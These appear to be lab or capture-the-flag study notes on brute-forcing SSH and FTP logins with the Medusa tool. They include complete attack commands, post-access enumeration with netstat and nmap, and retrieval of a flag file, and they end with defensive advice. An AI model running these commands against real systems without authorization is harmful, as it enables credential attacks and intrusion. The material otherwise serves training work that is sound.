# Web Services Brute Forcing

Web services such as SSH and FTP are commonly used for:
- Remote administration
- File transfers
- System management

These services often rely on:
```text
Username and password authentication
```

If weak credentials are used, attackers can perform brute-force attacks to gain unauthorized access.

This section demonstrates how tools like Medusa can be used to attack SSH and FTP services and why strong authentication is critical.

---

# SSH (Secure Shell)

SSH is a secure protocol used for:
- Remote login
- Command execution
- Secure file transfer

Unlike Telnet, SSH encrypts communication, making it far more secure. However, weak passwords can still make SSH vulnerable to brute-force attacks.

---

# FTP (File Transfer Protocol)

FTP is used for:
- Uploading files
- Downloading files
- Website file management

Traditional FTP transmits credentials in:
```text
Plaintext
```

which makes it vulnerable to:
- Credential interception
- Brute-force attacks

---

# Brute Forcing SSH with Medusa

Suppose we already know the SSH username:
```text
sshuser
```

We can use Medusa with a password wordlist to brute-force the login.

---

# SSH Attack Command

```bash
medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

---

# Command Breakdown

| Option | Purpose |
|--------|----------|
| `-h <IP>` | Target IP address |
| `-n <PORT>` | SSH port |
| `-u sshuser` | Username |
| `-P` | Password wordlist |
| `-M ssh` | SSH module |
| `-t 3` | 3 parallel login attempts |

The attack systematically tests passwords from the wordlist until valid credentials are discovered.

---

# Successful Login

When Medusa finds valid credentials, it displays:

```text
ACCOUNT FOUND
```

along with:
- Username
- Password
- Service

---

# Accessing the SSH Service

After finding the password, connect using:

```bash
ssh sshuser@<IP> -p PORT
```

This opens an interactive shell on the target system.

---

# Enumerating Additional Services

Once inside the system, enumeration becomes important.

Using:

```bash
netstat -tulpn | grep LISTEN
```

reveals listening services and open ports.

---

# Discovering FTP

Enumeration may reveal:
```text
Port 21 open
```

which indicates an FTP service.

Using Nmap helps confirm this:

```bash
nmap localhost
```

Output may show:

```text
21/tcp open ftp
22/tcp open ssh
```

---

# Brute Forcing FTP

After identifying the FTP service and possible username:
```text
ftpuser
```

we can launch another Medusa attack.

---

# FTP Attack Command

```bash
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

---

# Important Changes

| Option | Explanation |
|--------|-------------|
| `-h 127.0.0.1` | Target local FTP service |
| `-u ftpuser` | FTP username |
| `-M ftp` | FTP module |
| `-t 5` | Increased parallel attempts |

Medusa will again test passwords until valid FTP credentials are discovered.

---

# Accessing the FTP Server

After obtaining credentials:

```bash
ftp ftp://ftpuser:<PASSWORD>@localhost
```

This establishes an FTP session.

---

# Retrieving Files

Inside FTP, common commands include:

```bash
ls
```

Lists files.

```bash
get flag.txt
```

Downloads files from the server.

---

# Reading Downloaded Files

After downloading:

```bash
cat flag.txt
```

This displays the contents of the file.

---

# Key Takeaways

- SSH and FTP are common brute-force targets
- Weak passwords can completely bypass secure protocols
- Enumeration after initial access often reveals additional attack surfaces
- Medusa supports both SSH and FTP brute-forcing
- Parallel tasks increase attack speed
- Strong passwords and MFA are critical defenses against brute-force attacks
